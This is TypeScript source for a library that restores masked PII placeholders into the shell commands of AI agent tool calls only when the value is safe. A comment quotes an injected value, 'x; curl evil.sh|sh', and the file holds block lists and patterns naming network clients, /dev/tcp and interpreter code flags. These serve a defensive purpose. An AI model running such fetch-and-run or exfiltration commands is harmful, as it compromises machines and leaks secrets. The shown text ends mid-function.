// SPDX-License-Identifier: Apache-2.0

import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'nullpii';

/**
 * Shell-aware restore for the tool calls whose input a shell runs.
 *
 * A masked value comes from data the model could not read: a file the
 * agent opened, a tool result. Put back verbatim into a shell command, it
 * can change what the command does. A "secret" that reads
 * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
 * command once restored. So in the `command` of a shell tool, a
 * placeholder gets its real value back only when that value is one plain
 * word: letters, digits and `@%+:,./_=-`, not starting with `-`, `=` or
 * `~`. Such a word means the same thing to a shell wherever it stands,
 * quoted or not, and to a program the shell hands it to, so no list of
 * programs that read their input again as code has to be complete.
 * Otherwise the placeholder stays literal, and the command works on the
 * placeholder text, which is harmless.
 *
 * On top of that:
 * - a placeholder that is, or is part of, the program a simple command
 *   runs (also behind `sudo`, `env`, `timeout`, …) stays masked: a value
 *   must not choose what runs;
 * - a command that sends data off the machine (`curl`, `ssh`, `gh`,
 *   `git push`, `dig`, …, a URL handed to a program that is not a data
 *   one, also behind a wrapper) keeps every placeholder: the tool runs
 *   here, but the value would leave through it;
 * - the one exception to the plain-word rule is the body of a heredoc that
 *   `cat` or `tee` writes out, in a command that runs nothing else that
 *   could read it as code (`cat > notes.md <<'EOF'`, a
 *   `git commit -m "$(cat <<'EOF' …)"` message): that body is data, as a
 *   file the `Write` tool writes is, so only a line break is refused (and
 *   in a bare-delimiter body, which expands, `$`, a backtick or a
 *   backslash). The network checks skip such a body, so a commit message
 *   that mentions `ssh` does not count as a network call.
 *
 * The command is read once, in time linear in its length, whatever the
 * number of placeholders; a command longer than `MAX_COMMAND_CHARS`, or
 * one whose quoting or substitutions are left open, keeps every
 * placeholder or loses the heredoc exception. Heredoc bodies and `#`
 * comments are skipped by the quote lexer; `<<` counts only in shell code,
 * never inside quotes or as the here-string `<<<`. A `command` given as an
 * argv array (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`.
 * The Claude Code mod gets the same rules through the sidecar's `restore`
 * with `tool`.
 *
 * Best effort for what leaves the machine: no list names every network
 * client, and a value restored into a file (`Write`, `Edit`) can be sent
 * by a later command.
 */

/** Tools whose input a shell runs, as each agent names them: Claude
 * Code's `Bash`, Anthropic's bash tool (`bash`), and the `shell` tool of
 * OpenAI-style agents such as Codex. */
export const SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'bash', 'shell']);

/** The input field of a shell tool that the shell interprets. */
export const SHELL_COMMAND_FIELD = 'command';

/** Where a placeholder stands. `heredoc` is the body of a quoted-delimiter
 * heredoc and `heredoc-expanding` that of a bare one, both only while the
 * body is data (see `DATA_PROGRAMS`); any other body is `none`. */
export type QuoteContext = 'none' | 'single' | 'double' | 'heredoc' | 'heredoc-expanding';

/** Contexts that hold data a program writes out, not shell code. */
const DATA_BODY_CONTEXTS: ReadonlySet<QuoteContext> = new Set(['heredoc', 'heredoc-expanding']);

/** A value that may be restored outside a data heredoc body: one plain
 * word, with no character any shell or quoting gives a meaning to, and
 * not starting with `-` (an option), `=` (zsh's `=cmd` expansion) or `~`
 * (a home directory). */
const PLAIN_WORD = /^(?![-=~])[\p{L}\p{N}@%+:,./_=-]+$/u;

/** What a value may hold in a data heredoc body. */
const DATA_BODY_SAFE: Readonly<Record<'heredoc' | 'heredoc-expanding', RegExp>> = {
  // A quoted-delimiter body is literal; only a newline could end it early,
  // with the delimiter on a line of its own.
  heredoc: /^[^\n\u2028\u2029]*$/u,
  'heredoc-expanding': /^[^$`\\\n\u2028\u2029]*$/u,
};

/** Longest command read: a longer one keeps every placeholder, so the
 * work per tool call stays bounded whatever the model sends. */
export const MAX_COMMAND_CHARS = 256 * 1024;

/** The rest of one simple command, up to a bound: from an interpreter's
 * name to its code flag, past other options and their arguments. */
const SAME_COMMAND = String.raw`[^;&|\n]{0,256}?`;

/** Interpreter names, for the patterns that look inside quoted code. */
const INTERPRETER_NAMES = String.raw`(?:bash|sh|zsh|dash|ksh|fish|python[\d.]*|pypy[\d.]*|node|nodejs|bun|deno|perl|ruby|lua|php|Rscript|osascript|pwsh)`;

/** Code handed to an interpreter, read on the whole text so that it is
 * found where no program is read, inside an argument or a quoted string
 * (`docker run img sh -c "…"`, `find . -exec bash -c '…'`). Each code
 * flag may follow other options (`bash -o pipefail -c`); a flag cluster
 * counts when it holds the code letter (`-lc`). The program a command
 * itself runs is judged by name (`CODE_RUNNERS`). */
const NESTED_INTERPRETER = new RegExp(
  [
    String.raw`\b(?:bash|sh|zsh|dash|ksh|fish)\b${SAME_COMMAND}\s(?:-[A-Za-z]*c[A-Za-z]*|--command)\b`,
    String.raw`\beval\b|\bssh\b|\b(?:su|runuser|flock|script)\b${SAME_COMMAND}\s(?:-c|--command)\b`,
    String.raw`\b(?:python[\d.]*|pypy[\d.]*)\b${SAME_COMMAND}\s-[A-Za-z]*c[A-Za-z]*\b`,
    String.raw`\b(?:node|nodejs|bun|deno)\b${SAME_COMMAND}\s(?:-[A-Za-z]*[ep][A-Za-z]*|--eval|--print|eval)\b`,
    String.raw`\b(?:perl|ruby|lua|Rscript|osascript)\b${SAME_COMMAND}\s-[A-Za-z]*[eE][A-Za-z]*\b`,
    String.raw`\bphp\b${SAME_COMMAND}\s-[A-Za-z]*r[A-Za-z]*\b`,
    String.raw`\|&?\s*(?:sudo\s+)?(?:\S*/)?${INTERPRETER_NAMES}\b`,
    String.raw`\b${INTERPRETER_NAMES}\b${SAME_COMMAND}(?:<<<|[<>]\()`,
    /\b(?:awk|gawk|mawk|nawk|sed)\b/.source,
  ].join('|'),
);

/** Programs that run code given to them, in their arguments, their input
 * or a file: a value anywhere in a command that runs one may be read as
 * code. Lower case, without a version suffix (`python3.12` → `python`). */
const CODE_RUNNERS: ReadonlySet<string> = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'mksh',
  'fish',
  'csh',
  'tcsh',
  'busybox',
  'python',
  'pypy',
  'node',
  'nodejs',
  'bun',
  'deno',
  'tsx',
  'ts-node',
  'perl',
  'ruby',
  'irb',
  'lua',
  'luajit',
  'php',
  'rscript',
  'r',
  'julia',
  'osascript',
  'pwsh',
  'powershell',
  'tclsh',
  'expect',
  'awk',
  'gawk',
  'mawk',
  'nawk',
  'sed',
  'gsed',
  'eval',
  'source',
  '.',
  'xargs',
  'watch',
  'parallel',
  'flock',
  'script',
  'su',
  'runuser',
  'tmux',
  'screen',
  'at',
  'batch',
  'entr',
  'make',
  'gmake',
  'just',
  'npx',
  'pnpx',
  'bunx',
]);

/** Programs that run the program named after their own options, with the
 * options that take a separate argument. */
const WRAPPERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['sudo', new Set(['-u', '-g', '-h', '-p', '-r', '-t', '-C', '-D', '-U', '-T'])],
  ['doas', new Set(['-u', '-C'])],
  ['env', new Set(['-u', '-C', '--unset', '--chdir'])],
  ['nohup', new Set<string>()],
  ['command', new Set<string>()],
  ['builtin', new Set<string>()],
  ['exec', new Set(['-a'])],
  ['time', new Set(['-f', '-o', '--format', '--output'])],
  ['timeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['gtimeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['nice', new Set(['-n', '--adjustment'])],
  ['ionice', new Set(['-c', '-n', '-p', '-P', '-u'])],
  ['stdbuf', new Set(['-i', '-o', '-e'])],
  ['setsid', new Set<string>()],
  ['unbuffer', new Set<string>()],
  ['caffeinate', new Set(['-t', '-w'])],
  ['chronic', new Set<string>()],
  ['xargs', new Set(['-I', '-n', '-P', '-L', '-d', '-E', '-s', '-a'])],
]);

/** Wrappers that take a positional argument before the program
 * (`timeout 5 cmd`). */
const WRAPPER_POSITIONALS: ReadonlyMap<string, number> = new Map([
  ['timeout', 1],
  ['gtimeout', 1],
]);

/** Wrapper options that make it run a shell on a string, not a program
 * (`sudo -s`, `sudo -i`, `env -S "…"`). */
const WRAPPER_SHELL_OPTION: ReadonlyMap<string, RegExp> = new Map([
  ['sudo', /^-[A-Za-z]*[is]|^--(?:shell|login)$/],
  ['env', /^-[A-Za-z]*S|^--split-string/],
]);

/** Programs that send what they are given off the machine. Lower case. */
const NETWORK_PROGRAMS: ReadonlySet<string> = new Set([
  'curl',
  'curlie',
  'wget',
  'aria2c',
  'http',
  'https',
  'httpie',
  'xh',
  'nc',
  'nc.openbsd',
  'nc.traditional',
  'ncat',
  'netcat',
  'socat',
  'telnet',
  'ssh',
  'scp',
  'sftp',
  'rsync',
  'ftp',
  'lftp',
  'tftp',
  'ncftp',
  'websocat',
  'wscat',
  'grpcurl',
  'gh',
  'glab',
  'hub',
  'dig',
  'nslookup',
  'host',
  'drill',
  'kdig',
  'ping',
  'traceroute',
  'tracepath',
  'mtr',
  'whois',
  'nmap',
  'mail',
  'mailx',
  'sendmail',
  'mutt',
  'msmtp',
  'swaks',
  'aws',
  'gcloud',
  'gsutil',
  'bq',
  'az',
  'doctl',
  'oci',
  'kubectl',
  'helm',
  'oc',
  'heroku',
  'fly',
  'flyctl',
  'vercel',
  'netlify',
  'wrangler',
  'firebase',
  'supabase',
  'rclone',
  's3cmd',
  'smbclient',
  'iwr',
  'irm',
  'invoke-webrequest',
  'invoke-restmethod',
]);

/** Programs that send data out only through some of their subcommands;
 * a command counts when any of its words is one. */
const NETWORK_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  [
    'git',
    new Set([
      'push',
      'pull',
      'fetch',
      'clone',
      'ls-remote',
      'remote',
      'submodule',
      'send-email',
      'request-pull',
    ]),
  ],
  ['docker', new Set(['push', 'pull', 'login'])],
  ['podman', new Set(['push', 'pull', 'login'])],
  ['buildah', new Set(['push', 'pull', 'login'])],
  ['npm', new Set(['publish', 'login', 'adduser'])],
  ['pnpm', new Set(['publish', 'login'])],
  ['yarn', new Set(['publish', 'login', 'npm'])],
  ['bun', new Set(['publish'])],
  ['cargo', new Set(['publish', 'login'])],
  ['gem', new Set(['push', 'signin'])],
  ['twine', new Set(['upload'])],
  ['poetry', new Set(['publish'])],
  ['uv', new Set(['publish'])],
  ['openssl', new Set(['s_client', 's_server', 'ocsp'])],
]);

/** Network clients found anywhere in the text, inside quoted code too:
 * names that cannot be anything else (not after `.`, `/`… so `~/.ssh`
 * does not count), uploads by `git` and package managers, and `/dev/tcp`.
 * Best effort: no list names every way out. */
const NETWORK_CLIENT = new RegExp(
  [
    /(?<![\w.-])(?:curl|wget|ncat|netcat|socat|ssh|scp|sftp|rsync|telnet|aria2c|nslookup|traceroute|sendmail|mailx|websocat|wscat|grpcurl|gcloud|gsutil|kubectl|rclone|s3cmd|smbclient)(?![\w-])/
      .source,
    /\b(?:Invoke-WebRequest|Invoke-RestMethod)\b/.source,
    String.raw`\bgit\b${SAME_COMMAND}\s(?:push|pull|fetch|clone|ls-remote|remote|submodule|send-email)\b`,
    String.raw`\b(?:npm|pnpm|yarn|bun|cargo)\b${SAME_COMMAND}\spublish\b`,
    /\/dev\/(?:tcp|udp)\//.source,
  ].join('|'),
  'i',
);

/** In a command that runs code: a URL, a networking library, or a short
 * network client name, which that code may use. */
/** A URL: handed to a program that is not a data one, it may be opened. */
const URL_SCHEME = /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\//i;

const NETWORK_IN_CODE =
  /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\/|\b(?:requests|urllib|httpx|aiohttp|socket|fetch|axios|XMLHttpRequest|WebSocket|LWP|IO::Socket|Net::HTTP|http\.client|net\.connect|nc|gh|dig|ping|ftp|xh|aws)\b/;

/** Programs whose arguments and input are data, so that a heredoc body
 * in a command that runs only these is data too. */
const DATA_PROGRAMS: ReadonlySet<string> = new Set([
  'cat',
  'tee',
  'echo',
  'printf',
  'mkdir',
  'cd',
  'touch',
  'ls',
  'pwd',
  'true',
  ':',
]);

/** `git` subcommands that read their arguments as data and run no code
 * on them, so a commit message heredoc in `git add … && git commit …`
 * stays data. */
const DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'commit',
  'add',
  'rm',
  'mv',
  'status',
  'diff',
  'log',
  'show',
]);

/** Programs whose code can be ended by any character, letters included,
 * and that can then run a command: `sed`'s `s` takes any delimiter and an
 * `e` flag, `perl`'s `s///e` too. Not even a plain word is safe in their
 * code, so a command that runs one keeps every placeholder. */
const ANY_DELIMITER_PROGRAMS: ReadonlySet<string> = new Set(['sed', 'gsed', 'perl']);
const ANY_DELIMITER_IN_TEXT = /(?<![\w.-])(?:g?sed|perl)(?![\w.-])/;

/** Programs that make a file executable, to run it. */
const RUNS_FILE_PROGRAMS: ReadonlySet<string> = new Set(['chmod']);

/** Shell words that come before the program of a simple command. */
const LEADING_KEYWORDS: ReadonlySet<string> = new Set([
  'if',
  'then',
  'else',
  'elif',
  'do',
  'while',
  'until',
  '!',
  '{',
  'coproc',
]);

/** Shell words that start a simple command with no program to run. */
const NO_PROGRAM_KEYWORDS: ReadonlySet<string> = new Set([
  'for',
  'case',
  'select',
  'function',
  'fi',
  'done',
  'esac',
  '}',
  '[[',
]);

/** How many words of a simple command are read, and how far: enough for
 * wrappers, the program and its subcommand, bounded on long input. */
const MAX_WORDS = 64;
const MAX_WORD_SCAN = 4096;

/** A heredoc operator, read at one position: `<<` or `<<-`, then a
 * delimiter that is quoted (`'EOF'`, `"EOF"`), backslash-escaped (`\EOF`)
 * or bare (`EOF`). Groups: 1 dash, 3 quoted word, 4 escaped word, 5 bare. */
const HEREDOC_OPERATOR =
  /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))(?=[\s;&|<>()]|$)/;

/** Commands whose heredoc body is data, not code. */
const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat', 'tee']);

/** Characters after which a new simple command starts (see
 * `separatesCommands`). */
const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', ')', '{']);
const REDIRECTION_SIDES: ReadonlySet<string> = new Set(['<', '>']);

/** Characters after which `#` starts a comment: it must begin a word.
 * Not `$` (`$#`) or `{` (`${#x}`). A backtick counts, so a doubtful `#`
 * is read as a comment, which only makes the context after it stricter. */
const COMMENT_PRECEDERS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\n',
  ';',
  '&',
  '|',
  '(',
  ')',
  '<',
  '>',
  '`',
]);

const ENV_ASSIGNMENT = /^[A-Za-z_]\w*=/;
const LEADING_TABS = /^\t+/;
const WHITESPACE = /\s/;
/** A redirection word (`>`, `2>>log`, `&>`, `<in`); group 1 is empty
 * when the operator stands alone and its target is the next word. */
const REDIRECTION = /^\d*(?:[<>]{1,3}|&>>?|[<>]&)(\S*)$/;
/** A version or `.exe` suffix on a program name (`python3.12`, `pwsh.exe`). */
const PROGRAM_SUFFIX = /(?:[\d.]+|\.exe)$/;

type FrameKind = 'code' | 'subst' | 'backtick' | 'single' | 'ansi' | 'double' | 'body';

/** Shell code, where quotes, substitutions and operators mean something. */
const CODE_KINDS: ReadonlySet<FrameKind> = new Set(['code', 'subst', 'backtick']);

/** One level of shell nesting. `ansi` is `$'…'`, where backslash escapes
 * apply. `body` is an unquoted heredoc body: it expands `$` and backticks
 * like double quotes, but `"` is literal. In a code frame, `cmdStart` is
 * where the current simple command began, and `depth` counts the `(`
 * opened inside a `$(…)`. */
interface Frame {
  readonly kind: FrameKind;
  depth: number;
  cmdStart: number;
}

/** A heredoc whose body starts at the next newline of shell code. */
interface Heredoc {
  /** `undefined` when the delimiter could not be read. */
  readonly delimiter: string | undefined;
  /** Quoted or escaped delimiter: the body is literal. */
  readonly literal: boolean;
  /** `<<-`: leading tabs are stripped from the closing line. */
  readonly stripTabs: boolean;
  /** Fed to `cat` or `tee` and not piped on, so the body is data. */
  readonly data: boolean;
}

/** One pass over a command: the context at each target position, in
 * order, and the extent of every simple command met in shell code. */
interface Scan {
  readonly targets: readonly number[];
  readonly contexts: QuoteContext[];
  readonly commands: Array<readonly [number, number]>;
  /** The extent of every heredoc body written out as data. */
  readonly dataBodies: Array<readonly [number, number]>;
  /** The line the last `<<` was met on, and its last `|`, read once per
   * line so that many operators on one line cost linear time. */
  line: { end: number; lastPipe: number };
  /** The program word of the simple command the last `<<` was met in,
   * by the command's start, read once per command. */
  heredocCommand: { start: number; word: string };
  /** `HEREDOC_OPERATOR`, sticky, for this scan alone. */
  readonly heredocOperator: RegExp;
}

/** A word of a simple command, quotes and escapes removed; `computed`
 * when it holds an expansion, so its value is known only at run time. */
interface Word {
  readonly text: string;
  readonly computed: boolean;
}

/** What one simple command runs. */
interface Program {
  /** Lower case, without directory or version suffix; `undefined` when
   * an expansion names it (`$PY`, `$(which python3)`). */
  readonly name: string | undefined;
  /** Named by a path (`./run.sh`, `/tmp/x`): it runs a file. */
  readonly byPath: boolean;
  /** The wrappers it runs behind, normalised like `name`. */
  readonly wrappers: readonly string[];
  /** A wrapper runs a shell on a string (`sudo -s`, `env -S`). */
  readonly wrapperShell: boolean;
  /** Its arguments, as far as they were read. */
  readonly args: readonly string[];
}

/** What a command does, as far as restoring into it is concerned. */
interface Verdict {
  /** It sends data off the machine, runs a program in whose code no
   * value is safe (`sed`, `perl`), or is too long to read: nothing is
   * restored. */
  readonly offMachine: boolean;
  /** The context at each placeholder position, keyed by index. */
  readonly contextAt: ReadonlyMap<number, QuoteContext>;
  /** The placeholder positions that are, or are part of, the program a
   * simple command runs. */
  readonly programAt: ReadonlySet<number>;
}

/** Stands for a placeholder when the words before it are read. */
const PLACEHOLDER_STAND_IN = 'x';

/** True when `name` is one of the `SHELL_TOOLS`. */
export function isShellTool(name: unknown): boolean {
  return typeof name === 'string' && SHELL_TOOLS.has(name);
}

/** True when `command` sends data off the machine: a network client or an
 * upload, behind any wrapper, or code it runs that opens a URL or a
 * socket. */
export function sendsOffMachine(command: string): boolean {
  return judge(command, []).offMachine;
}

/** True when `value` can be put back as written in `context`: one plain
 * word, or in a data heredoc body a value that cannot end the body. */
export function shellSafe(value: string, context: QuoteContext): boolean {
  if (context === 'heredoc' || context === 'heredoc-expanding') {
    return DATA_BODY_SAFE[context].test(value);
  }
  return PLAIN_WORD.test(value);
}

/**
 * The context that decides what a restored value may contain at `index`
 * of a shell command: the strictest rule when the command runs code it
 * is handed, else the heredoc body or the shell quoting there.
 */
export function shellContextAt(command: string, index: number): QuoteContext {
  return judge(command, [index]).contextAt.get(index) ?? 'none';
}

/** Read `command` once and judge it at each of `targets` (ascending). */
function judge(command: string, targets: readonly number[]): Verdict {
  if (command.length > MAX_COMMAND_CHARS) {
    return { offMachine: true, contextAt: new Map(), programAt: new Set() };
  }
  const scan: Scan = {
    targets,
    contexts: [],
    commands: [],
    dataBodies: [],
    line: { end: -1, lastPipe: -1 },
    heredocCommand: { start: -1, word: '' },
    heredocOperator: new RegExp(HEREDOC_OPERATOR.source, 'y'),
  };
  const closed = lex(command, 0, command.length, codeFrame(), scan);
  const programs = scan.commands.flatMap(([start, end]) => {
    const p = programOf(wordsOf(command.slice(start, Math.min(end, start + MAX_WORD_SCAN))));
    return p === undefined ? [] : [p];
  });
  // Data bodies are text written out, not commands: a commit message that
  // mentions `ssh` or `bash -c` neither sends nor runs anything.
  const code = withoutRanges(command, scan.dataBodies);
  const strict = NESTED_INTERPRETER.test(code) || programs.some(runsCode);
  // `offMachine` also covers a program whose code no word is safe in.
  const offMachine =
    ANY_DELIMITER_IN_TEXT.test(code) ||
    programs.some((p) => p.name !== undefined && ANY_DELIMITER_PROGRAMS.has(p.name)) ||
    NETWORK_CLIENT.test(code) ||
    programs.some(sendsOut) ||
    (strict && NETWORK_IN_CODE.test(code)) ||
    (URL_SCHEME.test(code) && !programs.every(isDataProgram));
  const bodyContext = dataBodyContext(programs, strict || !closed);
  const contextAt = new Map<number, QuoteContext>();
  const programAt = new Set<number>();
  const settled = new Map<number, boolean>();
  targets.forEach((index, k) => {
    const context = scan.contexts[k] ?? 'none';
    if (strict) contextAt.set(index, 'none');
    else if (DATA_BODY_CONTEXTS.has(context)) contextAt.set(index, bodyContext(context));
    else contextAt.set(index, context);
    if (startsProgramAt(command, index, scan.commands, settled)) programAt.add(index);
  });
  return { offMachine, contextAt, programAt };
}

/** `text` with each of `ranges` blanked out, offsets kept. */
function withoutRanges(text: string, ranges: ReadonlyArray<readonly [number, number]>): string {
  let out = '';
  let last = 0;
  for (const [start, end] of ranges) {
    out += text.slice(last, start) + ' '.repeat(end - start);
    last = end;
  }
  return out + text.slice(last);
}

/** True when the placeholder at `index` stands in the program word of the
 * innermost simple command around it: the words before it are only
 * keywords, assignments, redirections and wrappers. Past the first
 * `MAX_WORD_SCAN` characters of a command, it is the program unless one
 * was already read there (`settled`, per command start). */
function startsProgramAt(
  command: string,
  index: number,
  commands: ReadonlyArray<readonly [number, number]>,
  settled: Map<number, boolean>,
): boolean {
  let start: number | undefined;
  for (const [s, e] of commands) {
    if (s <= index && index <= e && (start === undefined || s > start)) start = s;
  }
  if (start === undefined) return false;
  if (index - start > MAX_WORD_SCAN) return !programSettled(command, start, settled);
  const words = wordsOf(command.slice(start, index) + PLACEHOLDER_STAND_IN);
  if (words.length >= MAX_WORDS) return false;
  const own = words.at(-1);
  if (own === undefined || ENV_ASSIGNMENT.test(own.text) || REDIRECTION.test(own.text))
    return false;
  return programIsNext(words.slice(0, -1));
}

/** True when the command starting at `start` names its program within
 * its first `MAX_WORD_SCAN` characters, followed by another word. */
function programSettled(command: string, start: number, settled: Map<number, boolean>): boolean {
  const known = settled.get(start);
  if (known !== undefined) return known;
  const words = wordsOf(command.slice(start, start + MAX_WORD_SCAN));
  let found = false;
  for (let k = 1; k < words.length && !found; k++) found = !programIsNext(words.slice(0, k));
  settled.set(start, found);
  return found;
}

/** True when the word after `words` would be the program they run. */
function programIsNext(words: readonly Word[]): boolean {
  let k = skipPrefix(words, 0);
  const first = words[k];
  if (first !== undefined && NO_PROGRAM_KEYWORDS.has(first.text)) return false;
  for (;;) {
    const word = words[k];
    if (word === undefined) return true;
    const name = word.computed ? undefined : normalise(word.text);
    const options = name === undefined ? undefined : WRAPPERS.get(name);
    if (options === undefined || name === undefined) return false;
    k = skipWrapperArgs(words, k + 1, name, options).next;
  }
}

/** What a data heredoc body's context becomes, given the programs the
 * command runs: kept when they all treat it as data, the strictest rule
 * when one runs a file, else the double-quote rule. */
function dataBodyContext(
  programs: readonly Program[],
  strict: boolean,
): (context: QuoteContext) => QuoteContext {
  if (strict || programs.some(runsFile)) return () => 'none';
  if (programs.every(isDataProgram)) return (context) => context;
  return () => 'double';
}

function runsCode(p: Program): boolean {
  if (p.name === undefined || p.wrapperShell) return true;
  return CODE_RUNNERS.has(p.name) || p.wrappers.some((w) => CODE_RUNNERS.has(w));
}

function sendsOut(p: Program): boolean {
  if (p.name === undefined) return false;
  if (NETWORK_PROGRAMS.has(p.name)) return true;
  const subcommands = NETWORK_SUBCOMMANDS.get(p.name);
  return subcommands !== undefined && p.args.some((a) => subcommands.has(a));
}

function runsFile(p: Program): boolean {
  return p.byPath || (p.name !== undefined && RUNS_FILE_PROGRAMS.has(p.name));
}

function isDataProgram(p: Program): boolean {
  if (p.name === undefined || p.wrappers.length > 0 || p.byPath) return false;
  if (p.name === 'git') return DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
  return DATA_PROGRAMS.has(p.name);
}

/** The words at the start of a simple command, up to `MAX_WORDS` and a
 * `#` comment. */
function wordsOf(text: string): Word[] {
  const words: Word[] = [];
  let word = '';
  let inWord = false;
  let computed = false;
  let quote: string | undefined;
  const flush = (): void => {
    if (inWord) words.push({ text: word, computed });
    word = '';
    inWord = false;
    computed = false;
  };
  for (let i = 0; i < text.length && words.length < MAX_WORDS; i++) {
    const ch = text[i] ?? '';
    if (quote === "'") {
      if (ch === "'") quote = undefined;
      else word += ch;
      continue;
    }
    if (ch === '\\') {
      // A backslash before a newline continues the line; before anything
      // else it makes that character literal.
      const next = text[i + 1] ?? '';
      if (next !== '\n') {
        word += next;
        inWord = true;
      }
      i++;
      continue;
    }
    if (ch === '$' || ch === '`') computed = true;
    if (quote === '"') {
      if (ch === '"') quote = undefined;
      else word += ch;
      continue;
    }
    if (ch === '#' && !inWord) break;
    if (ch === "'" || ch === '"') {
      quote = ch;
      inWord = true;
    } else if (WHITESPACE.test(ch)) flush();
    else {
      word += ch;
      inWord = true;
    }
  }
  if (words.length < MAX_WORDS) flush();
  return words;
}

/** The program a simple command runs: past shell keywords, environment
 * assignments, redirections and wrappers with their options. `undefined`
 * when it runs none (`for`, `fi`, a bare assignment). */
function programOf(words: readonly Word[]): Program | undefined {
  let k = skipPrefix(words, 0);
  const first = words[k];
  if (first === undefined || NO_PROGRAM_KEYWORDS.has(first.text)) return undefined;
  const wrappers: string[] = [];
  let wrapperShell = false;
  for (;;) {
    const word = words[k];
    // A wrapper with nothing after it runs on its own (`xargs` reads the
    // command from its input).
    if (word === undefined) {
      const last = wrappers.at(-1);
      if (last === undefined) return undefined;
      return { name: last, byPath: false, wrappers, wrapperShell, args: [] };
    }
    const name = word.computed ? undefined : normalise(word.text);
    const options = name === undefined ? undefined : WRAPPERS.get(name);
    if (options === undefined || name === undefined) {
      const args = words.slice(k + 1).map((w) => w.text);
      return { name, byPath: word.text.includes('/'), wrappers, wrapperShell, args };
    }
    wrappers.push(name);
    const skipped = skipWrapperArgs(words, k + 1, name, options);
    wrapperShell ||= skipped.shell;
    k = skipped.next;
  }
}

/** Skip a wrapper's options (with their arguments), assignments and
 * positional arguments from `k`, up to the program it runs; `shell` when
 * one of those options makes it run a shell on a string. */
function skipWrapperArgs(
  words: readonly Word[],
  k: number,
  wrapper: string,
  options: ReadonlySet<string>,
): { next: number; shell: boolean } {
  const shellOption = WRAPPER_SHELL_OPTION.get(wrapper);
  let left = WRAPPER_POSITIONALS.get(wrapper) ?? 0;
  let shell = false;
  let i = k;
  for (;;) {
    const text = words[i]?.text;
    if (text === undefined) return { next: i, shell };
    if (text.startsWith('-') && text !== '-') {
      shell ||= shellOption?.test(text) === true;
      i += options.has(text) ? 2 : 1;
    } else if (ENV_ASSIGNMENT.test(text)) i += 1;
    else if (left > 0) {
      left -= 1;
      i += 1;
    } else return { next: i, shell };
  }
}

/** Skip shell keywords, assignments and redirections from `k`. */
function skipPrefix(words: readonly Word[], k: number): number {
  let i = k;
  for (;;) {
    const text = words[i]?.text;
    if (text === undefined) return i;
    if (LEADING_KEYWORDS.has(text) || ENV_ASSIGNMENT.test(text)) {
      i += 1;
      continue;
    }
    const m = REDIRECTION.exec(text);
    if (m === null) return i;
    i += m[1] === '' ? 2 : 1;
  }
}

/** A program name as the sets list it: no directory, lower case, no
 * version or `.exe` suffix (`/usr/bin/Python3.12` → `python`). */
function normalise(word: string): string {
  const base = (word.split('/').at(-1) ?? word).toLowerCase();
  const bare = base.replace(PROGRAM_SUFFIX, '');
  return bare === '' ? base : bare;
}

function codeFrame(): Frame {
  return { kind: 'code', depth: 0, cmdStart: 0 };
}

/** Lex `command` from `start` to `end`, with `base` as the nesting in
 * force at `start`: record the context at each target in range, and the
 * extent of each simple command of shell code. */
function lex(command: string, start: number, end: number, base: Frame, scan: Scan): boolean {
  const stack: Frame[] = [base];
  const pending: Heredoc[] = [];
  let i = start;
  while (i < end) {
    record(scan, i, contextOf(stack));
    const frame = stack.at(-1) ?? base;
    if (command[i] === '\n' && pending.length > 0 && CODE_KINDS.has(frame.kind)) {
      scan.commands.push([frame.cmdStart, i]);
      const next = readHeredocBodies(command, i + 1, pending, scan);
      // An unreadable delimiter or no closing line: the body's extent, and
      // so what follows it, is unknown.
      if (next === undefined) {
        record(scan, Number.POSITIVE_INFINITY, 'none');
        return false;
      }
      pending.length = 0;
      frame.cmdStart = next;
      i = next;
      continue;
    }
    i += advance(stack, frame, pending, command, i, scan);
  }
  record(scan, end - 1, contextOf(stack));
  for (const frame of stack) {
    if (CODE_KINDS.has(frame.kind)) scan.commands.push([frame.cmdStart, end]);
  }
  return stack.length === 1 && pending.length === 0;
}

/** Give `context` to every target not yet recorded up to `limit`. */
function record(scan: Scan, limit: number, context: QuoteContext): void {
  for (;;) {
    const target = scan.targets[scan.contexts.length];
    if (target === undefined || target > limit) return;
    scan.contexts.push(context);
  }
}

function contextOf(stack: readonly Frame[]): QuoteContext {
  const kind = stack.at(-1)?.kind;
  if (kind === 'single' || kind === 'ansi') return 'single';
  if (kind === 'double') return 'double';
  if (kind === 'body') return 'heredoc-expanding';
  return 'none';
}

/** Read the token at `i`, update the nesting, return its length. */
function advance(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i];
  if (frame.kind === 'single') {
    if (ch === "'") stack.pop();
    return 1;
  }
  if (frame.kind === 'ansi') {
    if (ch === '\\') return 2;
    if (ch === "'") stack.pop();
    return 1;
  }
  if (ch === '\\') return 2;
  if (ch === '$' && command[i + 1] === '(') {
    stack.push({ kind: 'subst', depth: 0, cmdStart: i + 2 });
    return 2;
  }
  if (ch === '`') {
    if (frame.kind === 'backtick') closeCommand(stack, frame, i, scan);
    else stack.push({ kind: 'backtick', depth: 0, cmdStart: i + 1 });
    return 1;
  }
  if (frame.kind === 'double') {
    if (ch === '"') stack.pop();
    return 1;
  }
  if (frame.kind === 'body') return 1;
  return advanceCode(stack, frame, pending, command, i, scan);
}

/** One token of shell code: the top level, or inside a substitution. */
function advanceCode(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i];
  if (ch === '#' && startsWord(command, i)) return commentLength(command, i);
  if (ch === '<' && command[i + 1] === '<') {
